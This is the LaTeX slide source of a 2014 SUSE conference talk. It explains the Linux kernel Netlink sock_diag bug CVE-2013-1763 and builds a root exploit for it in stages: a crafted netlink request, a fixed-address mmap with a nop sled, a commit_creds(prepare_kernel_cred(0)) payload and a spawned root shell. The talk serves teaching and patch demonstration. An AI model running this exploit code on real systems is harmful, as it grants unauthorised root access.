% vim: ai sw=2 spell spelllang=en

\documentclass[xcolor=dvipsnames]{beamer}

\let\Oldemph\emph
\renewcommand{\emph}[1]{\textcolor{blue}{\Oldemph{#1}}}
\newcommand{\heading}[1]{\textbf{\textcolor{BurntOrange}{#1}}}
\newcommand{\header}[1]{\textbf{\texttt{\textcolor{WildStrawberry}{#1}}}}
\newcommand{\doc}[1]{\textbf{\texttt{\textcolor{OliveGreen}{#1}}}}
\newcommand{\red}[1]{\textcolor{red}{#1}}

\newcommand\kgr{\textsc{kGraft}\xspace}

\mode<presentation>
{
\usetheme{Madrid}
}

\setbeamertemplate{navigation symbols}{}
%\setbeamertemplate{footline}[frame number]{}

\usepackage{adjustbox}
\usepackage[utf8x]{inputenc}
\usepackage{helvet}
\usepackage{mathptmx}
\usepackage[T1]{fontenc}
\usepackage{graphicx}
\usepackage{hyperref}
\usepackage[final]{listings}
\usepackage{multirow}
\usepackage{tikz}
\usepackage[absolute,overlay]{textpos}
\usepackage{xspace}
\usetikzlibrary{arrows, positioning}

\tikzset{tl_state/.style={rounded corners, thick, draw, minimum height=6mm,
	minimum width=12mm, bottom color=black!15, top color=black!5}}
\tikzset{tl_phase/.style={thick, draw, minimum size=8mm}}
\tikzset{tl_edge/.style={<-, >=stealth', semithick}}

\lstset{tabsize=2,numbers=none,showstringspaces=false,breaklines=true,
	breakatwhitespace=true,escapeinside={(*@}{@*)},
	basicstyle=\scriptsize,keywordstyle=\bfseries\color{OliveGreen},
	commentstyle=\color{blue}, columns=flexible, language=C,
	morekeywords={asm}}

\newcommand{\cmd}[2][]{\lstinline[columns=fullflexible, language=bash,
	basicstyle=\ttfamily, #1]$#2$}
\newcommand{\code}[2][]{\lstinline[columns=fullflexible, basicstyle=\ttfamily,
	#1]$#2$}

\definecolor{mygray}{gray}{.9}

\title{Write an Exploit in 30 Minutes}
\date[September 18\textsuperscript{th} 2014, ČB]{September
18\textsuperscript{th} 2014 \\ České Budějovice}

\author[Jiri~Slaby]{\textbf{Jiri~Slaby}}

\institute{SUSE Labs}

\begin{document}

\begin{frame}
  \titlepage
\end{frame}

%%%%%%%%%%%%%%%%%%%%%%%

\begin{frame}
  \frametitle{Introduction}

  \begin{itemize}
    \item We are developing \kgr in SUSE Labs
    \begin{itemize}
      \item Online Linux kernel patching framework (cf. J. Kosina's talk)
      \item Presenter is one of developers
    \end{itemize}

    \pause

    \item We wanted to demonstrate \kgr

    \pause

    \item ``Come up with a \emph{\kgr-patchable exploit}!''

    \pause

    \begin{itemize}
      \item The core of the presentation
    \end{itemize}

  \end{itemize}

\end{frame}

\begin{frame}
  \frametitle{Presentation Outline}

  \tableofcontents

\end{frame}

\section{Picking the Bug}

\begin{frame}
  \frametitle{Picking the Bug}

  \begin{itemize}
    \item What to look for (\emph{requirements})
    \begin{itemize}
      \item 100\% working exploit
      \item Fast exploit
      \item With a simple enough fix
    \end{itemize}

    \pause
    \medskip

    \item Where to look
    \begin{itemize}
      \item \emph{Exploit database}
      \item \url{http://www.exploit-db.com/}
      \item Over 30'000 exploits
      \item Not only for the Linux kernel
    \end{itemize}

  \end{itemize}

  \bigskip
  \pause

  \begin{center}
    \heading{We have chosen an exploit for a bug in the Netlink code}
  \end{center}

\end{frame}

\section{Description of the Bug}
\frame{\sectionpage}

\begin{frame}
  \frametitle{Description of the Bug}

  \begin{itemize}
    \item Vulnerabilities are numbered
    \begin{itemize}
      \item CVE (\url{http://cve.mitre.org/})
      \item This one is CVE-2013-1763 (our bnc\#805633)
    \end{itemize}

    \pause
    \medskip

    \item Bug in function \code{__sock_diag_rcv_msg}
    \begin{itemize}
      \item Messages handler
      \item Netlink interface: \code{PF_NETLINK}
      \item Diagnostic layer: \code{NETLINK_SOCK_DIAG}

    \end{itemize}

  \end{itemize}

  \bigskip
  \pause

  \begin{center}
    \heading{\code{__sock_diag_rcv_msg} handles messages from user. \\ It has
    to be careful!}
  \end{center}

\end{frame}

\begin{frame}[fragile]
  \frametitle{\code{__sock_diag_rcv_msg}}

\begin{onlyenv}<1>
\begin{lstlisting}[showlines]

\end{lstlisting}
\end{onlyenv}
\begin{onlyenv}<2>
\begin{lstlisting}[backgroundcolor=\color{mygray}]
static const struct sock_diag_handler *sock_diag_handlers[AF_MAX]; /* AF_MAX is 41 */
\end{lstlisting}
\end{onlyenv}
\begin{onlyenv}<3->
\begin{lstlisting}
static const struct sock_diag_handler *sock_diag_handlers[AF_MAX]; /* AF_MAX is 41 */
\end{lstlisting}
\end{onlyenv}
\begin{lstlisting}
static int __sock_diag_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh)
{
  int err;
  struct sock_diag_req *req = nlmsg_data(nlh);
  const struct sock_diag_handler *hndl;

  if (nlmsg_len(nlh) < sizeof(*req))
    return -EINVAL;
\end{lstlisting}
\begin{uncoverenv}<3->
\begin{lstlisting}[backgroundcolor=\color{mygray}]
  if (req->sdiag_family >= AF_MAX) /* commit 6e601a5356 */
    return -EINVAL;
\end{lstlisting}
\end{uncoverenv}
\begin{onlyenv}<2>
\begin{lstlisting}[backgroundcolor=\color{mygray}]
  mutex_lock(&sock_diag_table_mutex);
  hndl = sock_diag_handlers[req->sdiag_family]; /* use of user's req->sdiag_family (__u8) */
  if (hndl == NULL)
    err = -ENOENT;
  else
    err = hndl->dump(skb, nlh); /* dereference */
  mutex_unlock(&sock_diag_table_mutex);

  return err;
}
\end{lstlisting}
\end{onlyenv}
\begin{uncoverenv}<3->
\begin{lstlisting}
  mutex_lock(&sock_diag_table_mutex);
  hndl = sock_diag_handlers[req->sdiag_family]; /* use of user's req->sdiag_family (__u8) */
  if (hndl == NULL)
    err = -ENOENT;
  else
    err = hndl->dump(skb, nlh); /* dereference */
  mutex_unlock(&sock_diag_table_mutex);

  return err;
}
\end{lstlisting}
\end{uncoverenv}

\end{frame}

\section{Writing the Exploit}
\frame{\sectionpage}

\begin{frame}
  \frametitle{Writing the Exploit}

  \heading{Three basic steps}
  \begin{enumerate}
    \item Reach \code{__sock_diag_rcv_msg}

    \item Hit the error in the function
    \begin{itemize}
      \item Abuse it!
    \end{itemize}

    \item Run a root shell
  \end{enumerate}

  \bigskip

  Code at: \url{http://github.com/jirislaby/exploit-talk}

\end{frame}

\begin{frame}[fragile]
  \frametitle{Reaching the Function}

\heading{Reaching \code{__sock_diag_rcv_msg} using \code{socket} and
\code{send}}
\begin{lstlisting}
int main() {
  struct {
    struct nlmsghdr nlh;
    struct unix_diag_req r;
  } req;
  int fd;

  memset(&req, 0, sizeof(req));
  req.nlh.nlmsg_len = sizeof(req);
  req.nlh.nlmsg_type = SOCK_DIAG_BY_FAMILY;
  req.nlh.nlmsg_flags = NLM_F_ROOT|NLM_F_MATCH|NLM_F_REQUEST;
  req.nlh.nlmsg_seq = 123456;

  if ((fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_SOCK_DIAG)) < 0)
    return 1;

  if (send(fd, &req, sizeof(req), 0) < 0)
    return 1;

  return 0;
}
\end{lstlisting}
\end{frame}

\begin{frame}[fragile]
  \frametitle{Hitting the Error}

\begin{block}{Recall the kernel side}
\begin{lstlisting}
static const struct sock_diag_handler *sock_diag_handlers[41];
...
  hndl = sock_diag_handlers[req->sdiag_family];
...
  err = hndl->dump(skb, nlh);
\end{lstlisting}
\end{block}\pause
\heading{Giving a special value for \code{req->sdiag_family}}
\begin{lstlisting}
  memset(&req, 0, sizeof(req));
  req.nlh.nlmsg_len = sizeof(req);
  req.nlh.nlmsg_type = SOCK_DIAG_BY_FAMILY;
  req.nlh.nlmsg_flags = NLM_F_ROOT|NLM_F_MATCH|NLM_F_REQUEST;
  req.nlh.nlmsg_seq = 123456;
\end{lstlisting}\vspace{-0.7\baselineskip}
\begin{uncoverenv}<2->
\begin{lstlisting}[backgroundcolor=\color{mygray}]
  req.r.sdiag_family = 120;
\end{lstlisting}
\end{uncoverenv}
\begin{lstlisting}
  if ((fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_SOCK_DIAG)) < 0)
    return 1;

  if (send(fd, &req, sizeof(req), 0) < 0)
    return 1;
\end{lstlisting}

\end{frame}

\begin{frame}[fragile]
  \frametitle{Oops}

\begin{lstlisting}
BUG: unable to handle kernel paging request at (*@ \textbf{0000000100012a5c} @*)
IP: [<0000000100012a5c>] 0x100012a5c
...
Call Trace:
 [<ffffffff81439e66>] ? sock_diag_rcv_msg+0x76/0x130
 [<ffffffff81439df0>] ? sock_diag_unregister+0x50/0x50
 [<ffffffff81519145>] ? ftrace_graph_caller+0x85/0x85
 [<ffffffff81451659>] netlink_rcv_skb+0xa9/0xc0
 [<ffffffff81439d24>] ? sock_diag_rcv+0x24/0x40
 [<ffffffff81450c7a>] ? netlink_unicast+0xda/0x1b0
 [<ffffffff8145107c>] ? netlink_sendmsg+0x32c/0x750
 [<ffffffff8140eb6b>] ? sock_sendmsg+0x8b/0xc0
 [<ffffffff81186d3d>] ? __kmalloc+0x1cd/0x4a0
 [<ffffffff81412103>] ? sk_prot_alloc+0xb3/0x180
 [<ffffffff81186047>] ? kmem_cache_alloc_trace+0x207/0x450
 [<ffffffff8140ecd1>] ? SYSC_sendto+0xf1/0x180
 [<ffffffff811a06ae>] ? alloc_file+0x1e/0xf0
 [<ffffffff8140bcaf>] ? sock_alloc_file+0x9f/0x130
 [<ffffffff811ba6aa>] ? __fd_install+0x1a/0x40
 [<ffffffff815192a9>] ? system_call_fastpath+0x16/0x1b
\end{lstlisting}

\end{frame}

\begin{frame}[fragile]
  \frametitle{Mapping the Address}

\heading{The Oops was on \code{0x0000000100012a5c}, map it!}
\begin{lstlisting}
  memset(&req, 0, sizeof(req));
  req.nlh.nlmsg_len = sizeof(req);
  req.nlh.nlmsg_type = SOCK_DIAG_BY_FAMILY;
  req.nlh.nlmsg_flags = NLM_F_ROOT|NLM_F_MATCH|NLM_F_REQUEST;
  req.nlh.nlmsg_seq = 123456;
  req.r.sdiag_family = 120;
\end{lstlisting}
\begin{lstlisting}[backgroundcolor=\color{mygray}]
  unsigned long mmap_start, mmap_size;
  mmap_start = 0x0000000100000000;
  mmap_size = 0x2000000;

  if (mmap((void *)mmap_start, mmap_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0) == MAP_FAILED)
    return 1;

  memset((void *)mmap_start, 0xc3, mmap_size); /* 0xc3 is 'ret' */
\end{lstlisting}
\begin{lstlisting}
  if ((fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_SOCK_DIAG)) < 0)
    return 1;

  if (send(fd, &req, sizeof(req), 0) < 0)
    return 1;
\end{lstlisting}

\end{frame}

\begin{frame}[fragile]
  \frametitle{Elevating Privileges}

  \heading{In kernel, it is simple}
\begin{lstlisting}
  commit_creds(prepare_kernel_cred(0));
\end{lstlisting}

  \pause
  \medskip

  \heading{How to link against the symbols in userspace?}
  \begin{itemize}
    \item Find an address
    \begin{itemize}
      \item E.g.\ \code{A} of \code{x()}
    \end{itemize}
    \item Call indirectly
    \begin{itemize}
      \item \code{void (*y)() = A;} \\ \code{y();}
    \end{itemize}
  \end{itemize}

  \pause
  \medskip

  \heading{Obtaining a kernel function address}
  \begin{itemize}
    \item \code{sidt} instruction to find the kernel base
    \begin{itemize}
      \item Defunct, \code{sidt} gives the user a copy
    \end{itemize}

    \pause

    \item \cmd{/proc/kallsyms}
    \begin{itemize}
      \item Defunct, addresses are zeroed for non-root
    \end{itemize}

    \pause

    \item \cmd{System.map}
    \begin{itemize}
      \item But relocation unsupported
    \end{itemize}
  \end{itemize}

\end{frame}

\begin{frame}[fragile]
  \frametitle{Elevating Privileges}

\begin{block}{Code to elevate privileges}
\begin{tabular}{lll}
\begin{lstlisting}[showlines]
int (*commit_creds)(unsigned long) = X;
unsigned long
  (*prepare_kernel_cred)(
      unsigned long) = Y;

int kernel_code() {
  commit_creds(prepare_kernel_cred(0));
  return -1;
}
\end{lstlisting} &&
\begin{lstlisting}
void __jump(void);
void __jump_end(void);

void jump_payload_not_used() {
  asm volatile ("__jump:\n"
                "movq $kernel_code, %rax\n"
                "jmpq *%rax\n"
                "__jump_end:\n");
}
\end{lstlisting} %stopzone
\end{tabular}
\end{block}
\begin{onlyenv}<2>
\bigskip
\begin{center}
\begin{tabular}{l|l}
Exploit's \code{.text} & 0x100000000 \\ \hline
\begin{lstlisting}
int kernel_code() {
  commit_creds(prepare_kernel_cred(0));
  return -1;
}
\end{lstlisting} &
\begin{lstlisting}
...
<many nops>
nop
nop
nop
movq $kernel_code, %rax
jmpq *%rax
\end{lstlisting} %stopzone
\end{tabular}
\end{center}
\end{onlyenv}
\begin{uncoverenv}<3>
\begin{lstlisting}
  if (mmap((void *)mmap_start, mmap_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0) == MAP_FAILED)
    return 1;
\end{lstlisting}
\begin{lstlisting}[backgroundcolor=\color{mygray}]
  const unsigned long jump_sz = __jump_end - __jump;
  memset((void *)mmap_start, 0x90, mmap_size); /* 0x90 is 'nop' */
  memcpy((void *)mmap_start + mmap_size - jump_sz, __jump, jump_sz);
\end{lstlisting}
\begin{lstlisting}
  if ((fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_SOCK_DIAG)) < 0)
    return 1;
\end{lstlisting}
\end{uncoverenv}

\end{frame}

\begin{frame}[fragile]
  \frametitle{Running Root Shell}

\begin{lstlisting}
  unsigned long mmap_start, mmap_size;
  mmap_start = 0x0000000100000000;
  mmap_size = 0x2000000;

  if (mmap((void *)mmap_start, mmap_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0) == MAP_FAILED)
    return 1;

  const unsigned long jump_sz = __jump_end - __jump;
  memset((void *)mmap_start, 0x90, mmap_size); /* 0x90 is 'nop' */
  memcpy((void *)mmap_start + mmap_size - jump_sz, __jump, jump_sz);

  if ((fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_SOCK_DIAG)) < 0)
    return 1;

  if (send(fd, &req, sizeof(req), 0) < 0)
    return 1;
\end{lstlisting}
\begin{lstlisting}[backgroundcolor=\color{mygray}]
  if(!getuid())
    system("/bin/sh");
\end{lstlisting}
\begin{lstlisting}
  return 0;
}
\end{lstlisting}

\end{frame}

\section{Conclusion}

\begin{frame}
  \frametitle{Conclusion}

  \begin{itemize}
    \item Writing exploits is easy sometimes
    \item Be aware when writing code
  \end{itemize}

\end{frame}

\end{document}
